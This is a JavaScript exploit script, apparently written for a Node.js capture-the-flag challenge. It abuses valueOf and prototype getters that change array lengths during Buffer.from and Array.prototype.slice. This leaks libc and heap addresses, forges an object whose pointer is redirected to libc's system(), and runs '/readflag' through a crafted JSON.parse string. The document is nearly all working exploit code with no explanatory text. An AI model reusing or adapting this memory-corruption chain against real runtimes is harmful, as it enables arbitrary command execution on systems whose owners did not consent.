var buf = new ArrayBuffer(8);
var f64 = new Float64Array(buf);
var f32 = new Float32Array(buf);
var u32 = new Uint32Array(buf);
var u8 = new Uint8Array(buf);

var leaked_libc;
var leaked_heap;

function ftoil(f) {
      f64[0] = f;
      return u32[0];
}

function ftoih(f) {
     f64[0] = f;
        return u32[1];
}

 function itof(i) {
        u32[0] = i;
        return f32[0];
    }

function    printhex(val) {
        console.log('0x' + val.toString(16));
    }

function bytes_to_float(a, b, c, d, e, f,g,i){
        u8[0] = a;
        u8[1] = b;
        u8[2] = c;
        u8[3] = d;
        u8[4] = e;
        u8[5] = f;
        u8[6] = g;
        u8[7] = i;
        return f64[0];
}



function leak(){
    var obj =  {
        valueOf: function(){
                array.length = 3; // change the length of the array
                array.fill(0x17171717);
                return 2.2;
        }
    };

    var array = new Array(1024);
    array.fill(0x17)
    array[1] = obj;

    var target_buf;

    target_buf = Buffer.from(array)

    var view = Uint8Array.from(target_buf);

    var i = 0;
    var b0, b1, b2, b3, b4, b5, b6, b7;

    var ff;
    for(i=0; i < view.length/8; i += 8){
        ff = bytes_to_float(view[i],view[i+1],view[i+2],view[i+3],view[i+4],view[i+5] ,view[i+6],view[i+7]);
        if(i ==8){
            leaked_libc = ff;
        } else if(i == 16){
            leaked_heap = ff;
            break;
        }
    }
    printhex(ftoil(leaked_libc));
    printhex(ftoih(leaked_libc));
    printhex(ftoil(leaked_heap))
    printhex(ftoih(leaked_heap))

    for(i=0; i < 16*5; i++){
        target_buf.writeUInt8(0x0, i);
    }
    target_buf.writeUInt32LE(ftoil(leaked_heap) - 0xdfd00, 16);
    target_buf.writeUInt32LE(ftoih(leaked_heap), 20);

    target_buf.writeUInt8(0x15, 32);
    target_buf.writeUInt8(0x05, 34);

    target_buf.writeUInt32LE(ftoil(leaked_heap) + 0x60, 40);
    target_buf.writeUInt32LE(ftoih(leaked_heap), 44);

    target_buf.writeUInt8(0x10, 57);
    target_buf.writeUInt8(0x1c, 64);

    for(i=0; i < 4*16; i++){
        target_buf.writeUInt8(0x0, i + 80);
    }

    target_buf.writeUInt32LE(ftoil(leaked_libc) + 0x2c70, 48 + 80);
    target_buf.writeUInt32LE(ftoih(leaked_libc), 52 + 80);
}

function fake_obj_function(){

    var proto = {};
    var target_array =         [1, 2,  3, 4, 5.5, 6, 7, 8, 9, 10 ,6,6,6,6,6,6,6,6];
    var array =             [1.1, /**/, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9, 10.10 ,6,6,6,6,6,6,6,6];
    array.__proto__ = proto;
    var t = new ArrayBuffer(1024);
    var v = new DataView(t);
    var typed = new Uint32Array(1024);
    typed[0] = 0x17171717;
    typed[1] = 0x17171717;
    typed[2] = 0x19191919;
    typed[3] = 0x19191919;
    v.setUint32(0, 0x17171717);

    var kkkk, l, m, n, o, p;

    Object.defineProperty(proto, 1, {
        get: function(){
            array.length = 900000; // change the length of the array

            kkkk = new ArrayBuffer(512);
            var view = new DataView(kkkk);
            var i = 6;
            view.setUint8(i*8+0,  0x15);
            view.setUint8(i*8+1,  0x01);
            view.setUint8(i*8+2,  0x00);
            view.setUint8(i*8+3,  0x00);
            view.setUint8(i*8+4,  0x00);
            view.setUint8(i*8+5,  0x00);
            view.setUint8(i*8+6,  0x00);
            view.setUint8(i*8+7,  0x00);
            ftoil(leaked_heap);
            var j = 0;
            for(j=0; j < 8; j++){
                if(j == 0){
                    view.setUint8(i*8+8+j,  u8[j] + 0x10);
                } else {
                    view.setUint8(i*8+8+j,  u8[j]);
                }
            }
            view.setUint32(32, 0x17171717);
            view.setUint32(36, 0x17171717);
            view.setUint32(40, 0x17171717);
            view.setUint32(44, 0x17171717);
            return 2.2;
        }
    });
    var t = Array.prototype.slice.call(array, 1, 19);
    var variable = t[2];
    variable[0] = ftoil(leaked_libc) - 0x1763b0; // system_libc
    variable[1] = ftoih(leaked_libc);
    var x = Buffer.from("12121212121212121212121212121212121212121212121212");
    exec();
    //console.log(t[2]);
}

function exec(){
    const obj = JSON.parse('{"result": "/readflag #MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\\u3535MMM"}');
}

leak();
fake_obj_function();
